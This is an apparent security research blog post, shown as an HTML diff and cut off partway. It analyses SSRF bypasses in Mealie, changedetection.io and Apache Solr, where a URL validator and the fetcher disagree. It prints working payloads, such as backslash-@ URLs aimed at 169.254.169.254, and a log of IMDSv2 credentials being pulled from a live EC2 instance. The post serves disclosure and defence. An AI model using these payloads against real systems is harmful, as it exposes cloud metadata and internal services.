@@ -1,0 +1,1382 @@
+<!DOCTYPE html><html lang="en" style="--hue:#FFB9D7;--tint:#FFECF5"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>The Validator Can Lie: SSRF Beyond URL Validation · xclow3n</title><meta name="description" content="A URL validator does not validate a request. It validates one representation of a request at one moment. Thirteen language stacks, twelve bug families, and live product cases - changedetection.io reaching IMDS, GitLab discarding its own DNS pin, Mealie approving an A record while the fetcher dialled AAAA."><link rel="canonical" href="https://xclow3n.com/post/the-validator-can-lie/"><meta property="og:type" content="article"><meta property="og:title" content="The Validator Can Lie: SSRF Beyond URL Validation · xclow3n"><meta property="og:description" content="A URL validator does not validate a request. It validates one representation of a request at one moment. Thirteen language stacks, twelve bug families, and live product cases - changedetection.io reaching IMDS, GitLab discarding its own DNS pin, Mealie approving an A record while the fetcher dialled AAAA."><meta property="og:url" content="https://xclow3n.com/post/the-validator-can-lie/"><meta property="og:site_name" content="xclow3n"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="The Validator Can Lie: SSRF Beyond URL Validation · xclow3n"><meta name="twitter:description" content="A URL validator does not validate a request. It validates one representation of a request at one moment. Thirteen language stacks, twelve bug families, and live product cases - changedetection.io reaching IMDS, GitLab discarding its own DNS pin, Mealie approving an A record while the fetcher dialled AAAA."><meta name="author" content="Rajat Raghav"><meta name="theme-color" content="#090C0E"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Anton&family=Archivo:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap"><style>:root{--ground:#090C0E;--ground-2:#11161A;--paper:#FFFFFF;--rule:rgba(255,255,255,.22);--rule-2:rgba(255,255,255,.11);--dim:rgba(255,255,255,.54);--gap:10px;--display:"Anton","Arial Narrow",Haettenschweiler,Impact,sans-serif;--body:"Archivo",-apple-system,"Helvetica Neue",Arial,sans-serif;--mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,monospace;color-scheme:dark}*,*:before,*:after{margin:0;padding:0;box-sizing:border-box}html{background:var(--ground);-webkit-text-size-adjust:100%;scroll-behavior:smooth}body{background:var(--ground);color:var(--paper);font-family:var(--body);-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;overflow-x:clip}a{color:inherit;text-decoration:none}ul,ol{list-style:none}h1,h2,h3{font-weight:400;font-family:var(--display);text-transform:uppercase}img{max-width:100%;display:block}::selection{background:var(--paper);color:var(--ground)}:root{scrollbar-color:#2A3034 var(--ground);scrollbar-width:thin}::-webkit-scrollbar{width:11px;height:11px}::-webkit-scrollbar-track{background:var(--ground)}::-webkit-scrollbar-thumb{background:#2a3034;border:3px solid var(--ground)}::-webkit-scrollbar-thumb:hover{background:#4a5257}:focus-visible{outline:3px solid var(--paper);outline-offset:2px}.rail{display:flex;flex-wrap:wrap;gap:8px 26px;align-items:baseline;padding:16px 20px 11px;border-bottom:1px solid var(--rule);font-size:10px;letter-spacing:.22em;text-transform:uppercase;font-weight:600}.rail .sp{margin-left:auto}.rail .mut{color:var(--dim);font-weight:500}.rail a:hover{color:var(--paper)}.foot{display:flex;flex-wrap:wrap;gap:10px 26px;align-items:baseline;margin:0 20px;padding:20px 0 26px;border-top:1px solid var(--rule-2);font-size:10px;letter-spacing:.2em;text-transform:uppercase;font-weight:600;color:var(--dim)}.foot .sp{margin-left:auto}.foot a:hover{color:var(--paper)}.fact{display:inline-block;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:5px 9px 4px}@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*:before,*:after{animation-duration:.01ms!important;transition-duration:.01ms!important}}@media(max-width:640px){.rail{padding:12px 14px 9px;gap:6px 16px}.foot{margin:0 14px}}
+</style><link rel="stylesheet" href="/_astro/_slug_.DmeYV662.css"></head> <body>  <div class="progress" aria-hidden="true"><i id="bar"></i></div> <header class="rail"> <a href="/"><b>&larr; xclow3n</b></a> <span class="mut">Poster 09</span> <span class="sp mut">RESEARCH</span> <time datetime="2026-08">AUG 2026</time> </header>  <section class="head"> <div class="head__text"> <div class="meta"> <span class="num">09</span> <span>SSRF Beyond Validation</span> <span class="flag">Featured</span> </div> <h1>The Validator Can Lie: SSRF Beyond URL Validation</h1> <p class="stand">A URL validator does not validate a request. It validates one representation of a request at one moment. Thirteen language stacks, twelve bug families, and live product cases - changedetection.io reaching IMDS, GitLab discarding its own DNS pin, Mealie approving an A record while the fetcher dialled AAAA.</p> <ul class="facts"><li class="fact">13 stacks</li><li class="fact">12 families</li><li class="fact">IMDS reached</li><li class="fact">wire-confirmed</li></ul> <ul class="tags"><li>SSRF</li><li>URL Parsing</li><li>Parser Differential</li><li>HTTP/2</li><li>DNS</li></ul> </div> <div class="head__art" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 240"
+     preserveAspectRatio="xMidYMid slice" aria-hidden="true">
+  <!-- one stream is stamped at the gate, a second destination leaves -->
+  <defs>
+    <clipPath id="constructivist-the-validator-can-lie-cvV-l"><polygon points="-60,-60 328,-60 220,300 -60,300"/></clipPath>
+    <clipPath id="constructivist-the-validator-can-lie-cvV-r"><polygon points="328,-60 720,-60 720,300 220,300"/></clipPath>
+  </defs>
+  <rect x="0" y="0" width="640" height="240" fill="var(--hue)"/>
+  <polygon points="328,-60 720,-60 720,300 220,300" fill="var(--ground)"/>
+  <g clip-path="url(#constructivist-the-validator-can-lie-cvV-l)">
+    <polygon points="-60,300 130,300 -60,196" fill="var(--ground)"/>
+    <path d="M70.9 128.7A150 150 0 0 1 -44 327.7" fill="none" stroke="var(--ground)" stroke-width="17"/>
+    <path d="M117.9 111.6A200 200 0 0 1 -35.3 376.9" fill="none" stroke="var(--ground)" stroke-width="17"/>
+    <path d="M164.9 94.5A250 250 0 0 1 -26.6 426.2" fill="none" stroke="var(--ground)" stroke-width="17"/>
+    <polygon points="-8,196 3.4,257 20.1,253.9 8.8,192.8" fill="var(--ground)"/>
+    <polygon points="60,196 71.4,257 88.1,253.9 76.8,192.8" fill="var(--ground)"/>
+    <polygon points="128,196 139.4,257 156.1,253.9 144.8,192.8" fill="var(--ground)"/>
+    <polygon points="196,196 207.4,257 224.1,253.9 212.8,192.8" fill="var(--ground)"/>
+    <polygon points="264,196 275.4,257 292.1,253.9 280.8,192.8" fill="var(--ground)"/>
+    <polygon points="332,196 343.4,257 360.1,253.9 348.8,192.8" fill="var(--ground)"/>
+    <polygon points="400,196 411.4,257 428.1,253.9 416.8,192.8" fill="var(--ground)"/>
+    <polygon points="468,196 479.4,257 496.1,253.9 484.8,192.8" fill="var(--ground)"/>
+    <polygon points="536,196 547.4,257 564.1,253.9 552.8,192.8" fill="var(--ground)"/>
+    <polygon points="-140,-51 760,219 760,285 -140,15" fill="var(--ground)"/>
+    <polygon points="-44,-9.2 -33,-9.2 -41,30.8 -52,30.8" fill="var(--hue)"/>
+    <polygon points="10,7 21,7 13,47 2,47" fill="var(--hue)"/>
+    <polygon points="64,23.2 75,23.2 67,63.2 56,63.2" fill="var(--hue)"/>
+    <circle cx="150" cy="69" r="48" fill="var(--hue)"/>
+    <circle cx="150" cy="69" r="37" fill="var(--ground)"/>
+    <circle cx="150" cy="69" r="16.3" fill="var(--hue)"/>
+    <polygon points="304,-70 358,-70 244,310 190,310" fill="var(--ground)"/>
+    <polygon points="296,-70 304,-70 190,310 182,310" fill="var(--hue)"/>
+    <circle cx="278" cy="107" r="62" fill="var(--hue)"/>
+    <circle cx="278" cy="107" r="51" fill="var(--ground)"/>
+    <circle cx="278" cy="107" r="21.1" fill="var(--hue)"/>
+  </g>
+  <g clip-path="url(#constructivist-the-validator-can-lie-cvV-r)">
+    <polygon points="-8,196 3.4,257 20.1,253.9 8.8,192.8" fill="var(--hue)"/>
+    <polygon points="60,196 71.4,257 88.1,253.9 76.8,192.8" fill="var(--hue)"/>
+    <polygon points="128,196 139.4,257 156.1,253.9 144.8,192.8" fill="var(--hue)"/>
+    <polygon points="196,196 207.4,257 224.1,253.9 212.8,192.8" fill="var(--hue)"/>
+    <polygon points="264,196 275.4,257 292.1,253.9 280.8,192.8" fill="var(--hue)"/>
+    <polygon points="332,196 343.4,257 360.1,253.9 348.8,192.8" fill="var(--hue)"/>
+    <polygon points="400,196 411.4,257 428.1,253.9 416.8,192.8" fill="var(--hue)"/>
+    <polygon points="468,196 479.4,257 496.1,253.9 484.8,192.8" fill="var(--hue)"/>
+    <polygon points="536,196 547.4,257 564.1,253.9 552.8,192.8" fill="var(--hue)"/>
+    <path d="M447.8 -1.5A58 58 0 0 1 447.8 107.5" fill="none" stroke="var(--hue)" stroke-width="15"/>
+    <path d="M478 -33.6A100 100 0 0 1 478 139.6" fill="none" stroke="var(--hue)" stroke-width="15"/>
+    <path d="M509.5 -63.3A142 142 0 0 1 509.5 169.3" fill="none" stroke="var(--hue)" stroke-width="15"/>
+    <polygon points="-140,-51 760,219 760,285 -140,15" fill="var(--hue)"/>
+    <polygon points="-140,-39 760,231 760,273 -140,3" fill="var(--ground)"/>
+    <polygon points="372,118.6 380,118.6 373,152.6 365,152.6" fill="var(--hue)"/>
+    <polygon points="434,137.2 442,137.2 435,171.2 427,171.2" fill="var(--hue)"/>
+    <polygon points="496,155.8 504,155.8 497,189.8 489,189.8" fill="var(--hue)"/>
+    <polygon points="200,111 760,-90.6 760,-42.6 200,159" fill="var(--hue)"/>
+    <polygon points="375.8,37.8 458.6,8 480.2,68.1 397.4,97.9" fill="var(--hue)"/>
+    <polygon points="388.5,33.2 395.1,30.9 416.8,91.1 410.2,93.4" fill="var(--ground)"/>
+    <polygon points="405.4,27.1 412,24.8 433.7,85 427.1,87.3" fill="var(--ground)"/>
+    <polygon points="422.3,21 428.9,18.7 450.6,78.9 444,81.2" fill="var(--ground)"/>
+    <polygon points="439.3,14.9 445.9,12.6 467.6,72.8 461,75.1" fill="var(--ground)"/>
+    <circle cx="428" cy="53" r="26" fill="var(--ground)"/>
+    <circle cx="428" cy="53" r="17" fill="var(--hue)"/>
+    <circle cx="428" cy="53" r="7" fill="var(--ground)"/>
+    <polygon points="304,-70 358,-70 244,310 190,310" fill="var(--hue)"/>
+    <polygon points="358,-70 366,-70 252,310 244,310" fill="var(--ground)"/>
+    <circle cx="278" cy="107" r="62" fill="var(--ground)"/>
+    <circle cx="278" cy="107" r="51" fill="var(--hue)"/>
+    <circle cx="278" cy="107" r="21.1" fill="var(--ground)"/>
+  </g>
+  <polygon points="322.5,-60 333.5,-60 225.5,300 214.5,300" fill="var(--tint)"/>
+  <polygon points="300,93.5 700,-51.5 700,-40.5 300,104.5" fill="var(--tint)"/>
+  <polygon points="300,111.5 700,231.5 700,236.5 300,116.5" fill="var(--tint)"/>
+  <circle cx="278" cy="107" r="13" fill="var(--tint)"/>
+  <circle cx="428" cy="53" r="4" fill="var(--tint)"/>
+</svg>
+</div> </section> <div class="reading"> <nav class="toc" aria-label="Sections"> <p class="toc__cap">Contents</p> <ol> <li><a href="#the-wire-doesnt-say-what-the-validator-said" data-sec="the-wire-doesnt-say-what-the-validator-said"> <i>01</i><span>The wire doesn’t say what the validator said</span> </a></li><li><a href="#the-lens" data-sec="the-lens"> <i>02</i><span>The lens</span> </a></li><li><a href="#the-families" data-sec="the-families"> <i>03</i><span>The families</span> </a></li><li><a href="#two-parsers-one-socket" data-sec="two-parsers-one-socket"> <i>04</i><span>Two parsers, one socket</span> </a></li><li><a href="#resolve-stage-three-different-failures" data-sec="resolve-stage-three-different-failures"> <i>05</i><span>Resolve stage: three different failures</span> </a></li><li><a href="#one-header-rewrites-the-upstream-f8" data-sec="one-header-rewrites-the-upstream-f8"> <i>06</i><span>One header rewrites the upstream: F8</span> </a></li><li><a href="#the-checked-request-is-not-the-emitted-request" data-sec="the-checked-request-is-not-the-emitted-request"> <i>07</i><span>The checked request is not the emitted request</span> </a></li><li><a href="#redirects-escape-the-original-verdict-f5b" data-sec="redirects-escape-the-original-verdict-f5b"> <i>08</i><span>Redirects escape the original verdict: F5b</span> </a></li><li><a href="#composition" data-sec="composition"> <i>09</i><span>Composition</span> </a></li><li><a href="#across-thirteen-audited-stacks" data-sec="across-thirteen-audited-stacks"> <i>10</i><span>Across thirteen audited stacks</span> </a></li><li><a href="#defense-the-mastodon-pattern-per-language" data-sec="defense-the-mastodon-pattern-per-language"> <i>11</i><span>Defense: the Mastodon pattern, per language</span> </a></li><li><a href="#where-the-blade-stopped" data-sec="where-the-blade-stopped"> <i>12</i><span>Where the blade stopped</span> </a></li><li><a href="#prior-art-and-acknowledgements" data-sec="prior-art-and-acknowledgements"> <i>13</i><span>Prior art and acknowledgements</span> </a></li><li><a href="#references" data-sec="references"> <i>14</i><span>References</span> </a></li> </ol> </nav> <article class="doc"><h2 id="the-wire-doesnt-say-what-the-validator-said">The wire doesn’t say what the validator said</h2>
+<p>A Mealie server tells you it will not fetch internal IPv6 hosts. It says
+so in code. The guard sits in <code>mealie/pkgs/safehttp/transport.py</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">async</span><span style="color:#FF7B72"> def</span><span style="color:#D2A8FF"> handle_async_request</span><span style="color:#E6EDF3">(self, request):</span></span>
+<span class="line"><span style="color:#E6EDF3">    netloc </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> request.url.netloc.decode()</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#A5D6FF"> ":"</span><span style="color:#FF7B72"> in</span><span style="color:#E6EDF3"> netloc:</span></span>
+<span class="line"><span style="color:#E6EDF3">        netloc_parts </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> netloc.split(</span><span style="color:#A5D6FF">":"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        netloc </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> netloc_parts[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#79C0FF">        ...</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> ip:</span></span>
+<span class="line"><span style="color:#E6EDF3">        ip_str </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> socket.gethostbyname(netloc)</span></span>
+<span class="line"><span style="color:#E6EDF3">        ip </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> ipaddress.ip_address(ip_str)</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> ip.is_private:</span></span>
+<span class="line"><span style="color:#FF7B72">        raise</span><span style="color:#E6EDF3"> InvalidDomainError(</span><span style="color:#79C0FF">...</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#FF7B72"> await</span><span style="color:#79C0FF"> super</span><span style="color:#E6EDF3">().handle_async_request(request)</span></span></code></pre>
+<p>Using the unmodified Mealie image in a configured lab network, I gave one
+hostname two static addresses:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>dual.test.   A      8.8.8.8          ; public, passes the guard</span></span>
+<span class="line"><span>dual.test.   AAAA   fd00::beef        ; lab listener on loopback</span></span></code></pre>
+<p>The lab added <code>fd00::beef/128</code> to <code>lo</code> and wrote both entries to
+<code>/etc/hosts</code>. The guard called <code>gethostbyname("dual.test")</code>, got <code>8.8.8.8</code>,
+checked <code>is_private</code>, saw <code>False</code>, and returned. The parent transport kept
+the hostname. libcurl resolved it with <code>getaddrinfo</code>, selected
+<code>fd00::beef</code>, and delivered the request to the listener. The scrape
+endpoint returned the listener’s HTML to the caller.</p>
+<p>There is no race and no rebinding. The validator and fetcher consumed the
+same static hostname mapping. They called different resolver interfaces and
+received different address-family views.</p>
+<p>This is a Mealie bug, but the failure shape is not unique to Mealie. The
+guard validated one address returned by an IPv4-only resolver. The client
+later made a dual-stack connection decision from the original hostname.
+Nothing in the application bound the approved address to that connection.
+The URL parser is only one place where this can happen. Resolution, object
+mutation, authority construction, and redirect handling can lose the same
+binding.</p>
+<h2 id="the-lens">The lens</h2>
+<p>A URL validator does not validate a request. It validates one representation
+of a request at one moment. OWASP’s broader SSRF guidance [34] correctly says
+to inspect IPv4 and IPv6, check A and AAAA, disable redirects, and enforce
+egress policy. The missing verb is <em>bind</em>: how does the accepted address and
+authority stay attached to the connection the client opens?</p>
+<p>A security check approves one representation of a request, but the client
+later connects or emits from another representation that is not bound to the
+first verdict. Sometimes two parsers disagree.
+Sometimes one resolver returns half the address set. Sometimes the caller
+drops a validated IP. In each case, the approved destination differs from
+the destination used on the wire.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>       +-------+   +--------+   +----------------+   +---------+</span></span>
+<span class="line"><span>URL ---> parse |-->| object |-->| resolve/select |-->| connect |</span></span>
+<span class="line"><span>       +-------+   +--------+   +----------------+   +---------+</span></span>
+<span class="line"><span>           ^                                            |</span></span>
+<span class="line"><span>           |                                            v</span></span>
+<span class="line"><span>           |       +----------+   +------+   +---------------+</span></span>
+<span class="line"><span>           +-------| response |&#x3C;--| emit |&#x3C;--| TLS identity* |</span></span>
+<span class="line"><span>             3xx   +----------+   +------+   +---------------+</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>* HTTPS only</span></span></code></pre>
+<p>The stages are not always separate libraries. Resolution can also consume
+SVCB or HTTPS records. Alt-Svc can select another endpoint before connect.
+For an <code>https</code> URI, TLS still authenticates the original origin. Authority
+emission writes <code>:authority</code>, <code>Host</code>, and <code>:path</code>; a response can send a new
+URL back to parse. Ask what state carries the security verdict across each
+handoff.</p>
+<p>The disagreement at the first box is old and well-mapped. Pick a URL, find
+the two parsers an application runs it through, and diff what each one calls
+the host. This piece runs the same question after parsing: object build,
+resolution, TLS identity, authority emission, and routing. Some failures use
+behavior a specification permits. Some use invalid-input recovery, an
+unsafe API, or plain implementation nonconformance. The specifications do
+not authorize the whole class. They also do not bind an application’s
+validation result to the socket a client eventually opens.</p>
+<p>The parser cases below establish the lineage. The new spine is downstream:
+Mealie checks A and dials AAAA; GitLab computes a DNS pin and throws it away;
+ShenYu selects a configured upstream and mutates it from a header; NAT64
+can carry an approved IPv6 connection to a private IPv4 destination; Node
+emits different ASCII from Unicode a caller validated; redirects re-enter
+only part of a guard.
+Different stages, one failure: the verdict never reached the wire.</p>
+<p>Five production conditions put those downstream stages within reach:</p>
+<ul>
+<li>HTTP/2 carries <code>:authority</code>, <code>:path</code>, and <code>:scheme</code> as separate fields. The protocol constrains their meaning, but several client APIs still let application state override the authority derived from the URL.</li>
+<li>Dual-stack DNS is standard. <code>getaddrinfo</code> with <code>AF_UNSPEC</code> can return both families; <code>gethostbyname</code> sees only IPv4. Address selection and Happy Eyeballs then decide which usable address is tried [10].</li>
+<li>NAT64 is managed infrastructure, but it is configured infrastructure. AWS NAT Gateway can translate the well-known prefix to public and supported private IPv4 destinations. GCP Public NAT64 reaches internet IPv4; GCP Private NAT64 reaches supported private routes and was in Preview when tested [37][38]. A classifier gap becomes reachable only where the deployment routes the prefix through the relevant gateway.</li>
+<li>Some fetchers re-resolve. A validator’s verdict loses its binding to the address the socket dials unless the checked address is carried into the connection.</li>
+<li>Builders and setters can mutate URLs after validation, and many clients let the application override <code>Host</code>.</li>
+</ul>
+<p>RFC 9525, the current TLS server-identity standard, gives one precise
+example in §7.4 [32]:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>The textual representation of an IPv4 address might be misinterpreted as</span></span>
+<span class="line"><span>a valid FQDN in some contexts. This can result in different security</span></span>
+<span class="line"><span>treatment that might cause different components of a system to classify</span></span>
+<span class="line"><span>the value differently ... in which one component enforces a security</span></span>
+<span class="line"><span>rule that is conditional on the type of identifier but misclassifies an</span></span>
+<span class="line"><span>IP address as an FQDN, whereas a second component correctly classifies</span></span>
+<span class="line"><span>the identifier but incorrectly assumes that rules regarding IP addresses</span></span>
+<span class="line"><span>have been enforced by the first component.</span></span></code></pre>
+<p>One component enforces, a second assumes the first did. RFC 3986 [1] had
+already warned about inconsistent syntax components and numeric-IP filtering in
+§7.3 and §7.4. RFC 9525 does not define the composition model used later in
+this article. Its example is a useful instance of the same handoff failure.
+The sections below test each handoff.</p>
+<h2 id="the-families">The families</h2>
+<p>This article uses ten numbered families, named by the stage where they occur.
+F5 has two subtypes. Each is a place where an application can lose the
+binding between a check and the request. Some disagreements are permitted
+choices. Others are invalid-input recovery or implementation bugs. The
+sections that follow state which kind each finding is and what reached the
+wire.</p>
+<h3 id="what-the-findings-are-for">What the findings are for</h3>
+<p>Thirty-three product audits sit behind this article. Twenty-five were reported
+to the vendor. Six are recorded as skipped, because the impact was bounded by
+an API key, a MITM position or a loopback SNI, and did not clear the bar for a
+report. Two were reported and came back duplicate. Outcomes across the reported
+set vary the way they always do: some were fixed, some carry a CVE, some were
+closed as won’t-fix, some are still open.</p>
+<p>None of that is the argument. The disposition of a single report says something
+about one vendor’s triage queue, not about whether the shape is real. A finding
+that a vendor declined still shows the same validator and fetcher reading the
+same bytes differently, and a finding that earned a CVE proves nothing extra
+about the lens.</p>
+<p>The cases in the sections that follow are here as evidence for one claim: that
+a verdict which does not survive into the object, the resolver, the socket, the
+authority and the next hop is only a comment on an earlier state. Each one is
+included because it demonstrates a handoff, and each states plainly what
+reached the wire. Where a mechanism never reached a product at all, it is in
+“Where the blade stopped” instead, and says so.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>stage           family   the disagreement</span></span>
+<span class="line"><span>-----------------------------------------------------------------</span></span>
+<span class="line"><span>parse           F1       authority boundary: \, @, scheme regex</span></span>
+<span class="line"><span>parse/classify  F4       parsers disagree whether the host is an IP</span></span>
+<span class="line"><span>resolve         F2       validator and client use different resolver views</span></span>
+<span class="line"><span>                F11      validator resolves the pin, caller drops it</span></span>
+<span class="line"><span>                F12      destination classes or embeddings are missing</span></span>
+<span class="line"><span>object-build    F8       selected object mutated before it is emitted</span></span>
+<span class="line"><span>authority-emit  F6       caller-supplied Host overrides the URL</span></span>
+<span class="line"><span>                F7       H/2 :authority is not the URL host</span></span>
+<span class="line"><span>route           F5       request routing changes after validation</span></span>
+<span class="line"><span>                F5a      path normalizes after the check</span></span>
+<span class="line"><span>                F5b      redirect target is not re-checked</span></span></code></pre>
+<p>F9 sits at the parse/emit boundary. It is a charset narrowing that
+manufactures wire bytes the caller did not validate. The labels retain the
+working corpus’s numbering: F3 is IDN drift and F10 was dropped.</p>
+<p>Evidence has one grade. <code>P</code> means the request ran through a shipped product
+interface. <code>L</code> means shipping component code or its exact decision path ran
+in a lab, but not through the full product transaction. <code>M</code> means mechanism
+or classifier only. Configuration requirements are stated separately. Each
+substantive case also states where the proof stops: classifier, dial, HTTP
+request, or response body. A composition claim needs the composed request on
+the wire. Two separately confirmed legs do not establish it.</p>
+<p>Counts and exclusivity claims in this article are scoped to the audited
+corpus and the paths exercised. “Thirteen stacks” means the thirteen matrix
+columns in §10; “one composition” means one wire-confirmed across the product
+paths exercised here. A <code>-</code> in the matrix or an unconfirmed pairing means
+not observed here, not impossible elsewhere.</p>
+<h2 id="two-parsers-one-socket">Two parsers, one socket</h2>
+<p>The authority boundary is the oldest seam and still the busiest. F1 is <code>U</code>
+in all thirteen audited stack columns in §10. Two findings use it directly.</p>
+<h3 id="changedetectionio-backslash--to-live-imds">changedetection.io: backslash-@ to live IMDS</h3>
+<p>RFC 9110 §4.2.4 [2] deprecates <code>user@host</code> and says a recipient SHOULD treat
+its presence as an error. That does not authorize this payload. RFC 3986 does
+not permit a literal backslash in userinfo or host syntax. The finding is an
+invalid-input recovery differential: changedetection.io runs three parsers
+on the same string, and they recover three different authorities.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>payload                                       gate_sees      fetch_dials</span></span>
+<span class="line"><span>--------------------------------------------------------------------------</span></span>
+<span class="line"><span>http://169.254.169.254:80\@example.com/       example.com    169.254.169.254</span></span>
+<span class="line"><span>http://10.89.0.50:80\@example.com/            example.com    10.89.0.50</span></span></code></pre>
+<p>In order along the request path:</p>
+<ul>
+<li><code>validators.url()</code> (PyPI <code>validators</code>, the add-time check) reads <code>\@</code> as path data, takes <code>169.254.169.254:80</code> as host:port, accepts.</li>
+<li><code>urllib.parse.urlparse().hostname</code> (the SSRF guard) reads <code>\</code> as userinfo, returns the host after the last <code>@</code>: <code>example.com</code>.</li>
+<li><code>urllib3</code> inside <code>requests</code> (the fetcher) ends the authority at the backslash: <code>169.254.169.254</code>.</li>
+</ul>
+<p>The guard and the fetcher are not the same parser. On a live EC2 instance,
+with a watch’s attacker-chosen method and headers, the full IMDSv2 flow runs
+and the instance ID lands back as stored watch content:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[watch 1] PUT 169.254.169.254/latest/api/token</span></span>
+<span class="line"><span>          -> IMDSv2 token, 56 chars, AQAEAO...</span></span>
+<span class="line"><span>[watch 2] GET 169.254.169.254/latest/meta-data/instance-id</span></span>
+<span class="line"><span>          -> i-0fcdb766aa5062aa5</span></span></code></pre>
+<p>This is <code>P</code> evidence at response-body depth through the shipped watch path.
+Default Docker image, unauthenticated. The important point is the third parser:
+it is a third-party library imported <em>specifically to validate URLs</em>, and it
+is the one that accepts the backslash-port form. The 2026 patch
+(CVE-2026-27696 [26]) added <code>is_private_hostname</code> at fetch time and on every
+redirect hop. It wired the check to <code>urlparse(url).hostname</code>, the
+same parser the disagreement is about. The right check, in the wrong parser.
+Validate the bytes the fetcher dials: <code>urllib3.util.parse_url(url).host</code>.</p>
+<h3 id="apache-solr-two-scheme-regexes-one-project">Apache Solr: two scheme regexes, one project</h3>
+<p>RFC 3986 §3.1 defines one scheme grammar:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )</span></span></code></pre>
+<p>Write that grammar twice, in two regexes, and the two
+spellings disagree about what counts as a scheme. Solr writes it twice.</p>
+<p>The <code>shards</code> query parameter lists the shard URLs a node fans a search out
+to. It is attacker-supplied, so Solr runs it through <code>AllowListUrlChecker</code>,
+the guard added for CVE-2017-3164 [12] and CVE-2021-27905; in SolrCloud it is
+on with no configuration, the live-node set as its allow-list. The guard
+derives <code>host:port</code> from each URL with one regex.</p>
+<p><code>solr/core/src/java/org/apache/solr/security/AllowListUrlChecker.java</code></p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#FF7B72">private</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> final</span><span style="color:#E6EDF3"> Pattern</span><span style="color:#E6EDF3"> PROTOCOL_PATTERN</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> Pattern.</span><span style="color:#D2A8FF">compile</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"(</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">w+)(://.*)"</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> (protocolMatcher.</span><span style="color:#D2A8FF">matches</span><span style="color:#E6EDF3">()) {</span></span>
+<span class="line"><span style="color:#FF7B72">  if</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">!</span><span style="color:#E6EDF3">protocolMatcher.</span><span style="color:#D2A8FF">group</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">).</span><span style="color:#D2A8FF">startsWith</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"http"</span><span style="color:#E6EDF3">)) {</span></span>
+<span class="line"><span style="color:#E6EDF3">    url </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "http"</span><span style="color:#FF7B72"> +</span><span style="color:#E6EDF3"> protocolMatcher.</span><span style="color:#D2A8FF">group</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">2</span><span style="color:#E6EDF3">);   </span><span style="color:#8B949E">// rewrite non-http scheme</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#E6EDF3">  u </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> URI.</span><span style="color:#D2A8FF">create</span><span style="color:#E6EDF3">(url);</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p><code>\w</code> is <code>[A-Za-z0-9_]</code>, so a run of digits or uppercase letters before <code>://</code>
+is a scheme. For <code>2130706433://realnode:8983/solr/test</code> the guard rewrites
+to <code>http://realnode:8983/solr/test</code>, and <code>java.net.URI</code> reports
+<code>host=realnode, port=8983</code>. That is a real live node, so it is approved.</p>
+<p>The fetcher decides whether a URL already has a scheme with a different
+regex.</p>
+<p><code>solr/solrj/src/java/org/apache/solr/common/util/URLUtil.java</code></p>
